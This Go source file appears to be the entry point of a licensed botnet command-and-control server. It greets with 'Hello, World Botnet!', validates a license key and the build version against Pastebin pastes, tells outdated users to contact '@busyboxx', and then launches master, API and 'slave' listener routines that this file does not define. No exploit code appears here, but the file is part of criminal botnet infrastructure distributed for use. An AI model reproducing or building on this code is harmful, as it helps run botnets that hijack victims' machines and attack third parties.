package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var buildversion = 1.2

func main() {
	fmt.Printf("Hello, World Botnet! %s\r\n", Version)

	if !verifyLicense() {
		fmt.Println("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m \x1b[1;38;5;9mError\x1b[0m Please obtain a valid license key.", time.Now().Format("2006-01-02 15:04:05"))
		return
	}

	if err := checkUpdate(); err != nil {
		log.Fatalf("Update check failed: %v", err)
		return
	}

	if err := OpenConfig(Options, "assets", "server.toml"); err != nil {
		log.Fatalf("Config: %v", err)
	}

	if err := SpawnSQL(); err != nil {
		log.Fatalf("Config: %v", err)
	}

	go Master()
	go NewAPI()
	go Title()

	// Execute the main slave listener
	if err := Slave(); err != nil {
		log.Fatalf("Config: %v", err)
	}
	select {}

}

func verifyLicense() bool {
	key, err := loadLicenseKey("assets/license.lkc")
	if err != nil {
		fmt.Printf("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m \x1b[1;38;5;9mError\x1b[0m loading license key ", time.Now().Format("2006-01-02 15:04:05"))
		return false
	}

	// Fetch the expected license content from Pastebin
	expectedContent, err := getPastebinContent("QNRV2rUg") // Replace with your Pastebin key
	if err != nil {
		fmt.Println("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m Error fetching expected license content")
		return false
	}

	fmt.Println("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m \x1b[1;38;5;10mSuccessfully\x1b[0m Loaded License Key:", key)

	// Split the expected content into lines
	expectedKeys := strings.Split(expectedContent, "\n")

	// Trim spaces from the loaded key
	key = strings.TrimSpace(key)

	// Iterate through the expected keys and check for a match
	for _, expectedKey := range expectedKeys {
		expectedKey = strings.TrimSpace(expectedKey)
		if key == expectedKey {
			fmt.Println("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m License Verification Result: true")
			return true
		}
	}

	fmt.Println("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m License Verification Result: false")
	return false
}

func loadLicenseKey(filename string) (string, error) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(data)), nil
}

func getPastebinContent(pastebinKey string) (string, error) {
	resp, err := http.Get("https://pastebin.com/raw/" + pastebinKey)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func checkUpdate() error {
	// Fetch the current version from Pastebin
	currentVersionStr, err := getPastebinContent("GP7Vpjx1") // Replace with your Pastebin key
	if err != nil {
		return fmt.Errorf("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m Error fetching current version: %v", err)
	}

	currentVersion, err := strconv.ParseFloat(strings.TrimSpace(currentVersionStr), 64)
	if err != nil {
		return fmt.Errorf("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m Error parsing current version: %v", err)
	}

	if buildversion < currentVersion {
		fmt.Printf("Your version (%.1f) is outdated. Please update to the latest version (%.1f)\n", buildversion, currentVersion)
		fmt.Println("Contact @busyboxx for the latest version.")
		// Force close the application
		os.Exit(1)
	}

	fmt.Printf("\x1b[0;1;48;5;105;38;5;16m License system  \x1b[0m Your version (%.1f) is up-to-date.\n", buildversion)
	return nil
}
